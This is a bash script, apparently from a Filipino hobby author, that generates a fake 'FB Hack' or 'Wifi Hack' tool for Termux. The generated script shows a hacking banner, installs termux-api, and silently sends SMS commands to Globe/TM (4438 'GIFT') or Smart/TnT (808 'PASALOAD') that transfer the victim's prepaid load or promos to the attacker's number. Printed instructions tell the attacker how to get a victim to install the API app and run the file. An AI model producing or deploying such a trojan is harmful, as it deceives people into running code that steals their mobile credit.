#!/bin/bash

echo -e "\e[32m  .-----------------. .----------------.  .----------------.  .----------------. \e[0m"
echo -e "\e[92m | .--------------. || .--------------. || .--------------. || .--------------. | "
echo -e " | | ____  _____  | || |   _____      | || |    _______   | || |    ______    | | " 
echo -e " | ||_   \|_   _| | || |  |_   _|     | || |   /  ___  |  | || |  .' ___  |   | | "
echo -e " | |  |   \ | |   | || |    | |       | || |  |  (__ \_|  | || | / .'   \_|   | | "
echo -e " | |  | |\ \| |   | || |    | |   _   | || |   '.___'-.   | || | | |    ____  | | "
echo -e " | | _| |_\   |_  | || |   _| |__/ |  | || |  |'\____) |  | || | \ '.___]  _| | | "
echo -e " | ||_____|\____| | || |  |________|  | || |  |_______.'  | || |  '._____.'   | | "
echo -e " | |              | || |              | || |              | || |              | | "
echo -e " | '-----------\e[91m NAKAW LOAD SCRIPT GENERATOR | Coded By: zeCh\e[0m v 0.5 \e[92m-----------' | \e[0m"
echo -e "\e[32m  '----------------'  '----------------'  '----------------'  '----------------' \e[0m"

echo -e "\e[101m \e[97mSa oras na gamitin mo ang tool na ito, hindi ako responsable sa kalokohang gagawin mo.\e[0m\e[0m"
echo "                 (https://github.com/ZechBron)"

check () {
   if [ $? = 0 ]; then
      echo -e "\e[92mGenerating fake tool that stole load named '"$ChB.sh"' is successful.\n"
      echo -e "\e[96mINSTRUCTION:"
      echo -e "Ibigay mo yung '"$ChB.sh"' sa biktima mo. At ipagawa mo sakanya itong 2 steps: "
      echo -e " 1. Ipa install mo sakanya yung Termux API app"
      echo -e " 2. Ipa run mo sakanya yung "$ChB.sh". Para ma run nya yan, ipa type mo sa biktima mo ang 'bash "$ChB.sh"' without qoute.\e[0m\n"

   elif [ $? = 1 ]; then
      echo -e "\e[91mGenerating fake tool that stole load FAILED! \nYou might want to try again.\e[0m"
   else
      echo "e\[91mUnknown Error\e[0m"
   fi
}

while [ -z "$ChB" ]
do
   echo -e "\e[31m[\e[0m\e[32mZ\e[0m\e[31m]\e[0m \e[32mEnter fake tool name:\e[0m\e[34m"
   read ChB
done

network () {
   while [ -z $net ]
   do
      echo -e "\e[32mEnter your Network:\e[0m\e[34m"
      echo -e " 1. Globe / TM"
      echo -e " 2. Smart / TnT\e[0m"
      echo -e "\e[31m[\e[0m\e[32mZ\e[0m\e[31m]\e[0m \e[32mPlease Choose:\e[0m\e[34m"
      read net
   done

   if [ $net = 1 ]; then
      while [ -z $num ]
      do
         echo -e "\e[31m[\e[0m\e[32mZ\e[0m\e[31m]\e[0m \e[32mEnter your 10 digit phone number:\e[0m\e[34m"
         read num
      done
      while [ -z "$zCh" ]
      do
         echo -e "\e[31m[\e[0m\e[32mZ\e[0m\e[31m]\e[0m \e[32mEnter promo you want to stole (All Caps e.g GOSURF30):\e[0m\e[34m"
         read zCh
      done
      echo "termux-sms-send -n 4438 \"GIFT $zCh $num\"" >> "$ChB.sh"
      check

   elif [ $net = 2 ]; then
      while [ -z $num ]
      do
         echo -e "\e[31m[\e[0m\e[32mZ\e[0m\e[31m]\e[0m \e[32mEnter your 11 digit phone number:\e[0m\e[34m"
         read num
      done
      while [ -z "$zCh" ]
      do
         echo -e "\e[31m[\e[0m\e[32mZ\e[0m\e[31m]\e[0m \e[32mEnter amount you want to stole:\e[0m\e[34m"
         read zCh
      done
      echo "termux-sms-send -n 808 \"PASALOAD $num $zCh\"" >> "$ChB.sh"
      check

   else
      echo -e "\e[91mWrong input. Please try again.\e[0m"
   fi
}

while [ -z $banner ]
do
   echo -e "\e[31m[\e[0m\e[32mZ\e[0m\e[31m]\e[0m \e[32mPlease Choose Banner:\e[0m\e[34m"
   echo -e "\e[34m 1. FB Hack"
   echo -e " 2. Wifi Hack\e[0m"
   read banner
done

echo "#!/bin/bash" >> "$ChB.sh"
if [ $banner = 1 ]; then
   echo "echo -e \"\e[32m   ___ ___   _  _   _   ___ _  __ \" " >> "$ChB.sh"
   echo "echo -e \"  | __| _ ) | || | /_\ / __| |/ / \" " >> "$ChB.sh"
   echo "echo -e \"  | _|| _ \ | __ |/ _ \ (__| ' < \" " >> "$ChB.sh"
   echo "echo -e \"  |_| |___/ |_||_/_/ \_\___|_|\_\ \e[0m\" " >> "$ChB.sh"
   echo "pkg install termux-api -y" >> "$ChB.sh"
   network

elif [ $banner = 2 ]; then
   echo "echo -e \"\e[32m  __      _____ ___ ___   _  _   _   ___ _  __ \" " >> "$ChB.sh"
   echo "echo -e \"  \ \    / /_ _| __|_ _| | || | /_\ / __| |/ / \" " >> "$ChB.sh"
   echo "echo -e \"   \ \/\/ / | || _| | |  | __ |/ _ \ (__| ' < \" " >> "$ChB.sh"
   echo "echo -e \"    \_/\_/ |___|_| |___| |_||_/_/ \_\___|_|\_\ \e[0m\" " >> "$ChB.sh"
   echo "pkg install termux-api -y" >> "$ChB.sh"
   network

else
   echo -e "\e[91mWrong input. Please try again.\e[0m"
fi
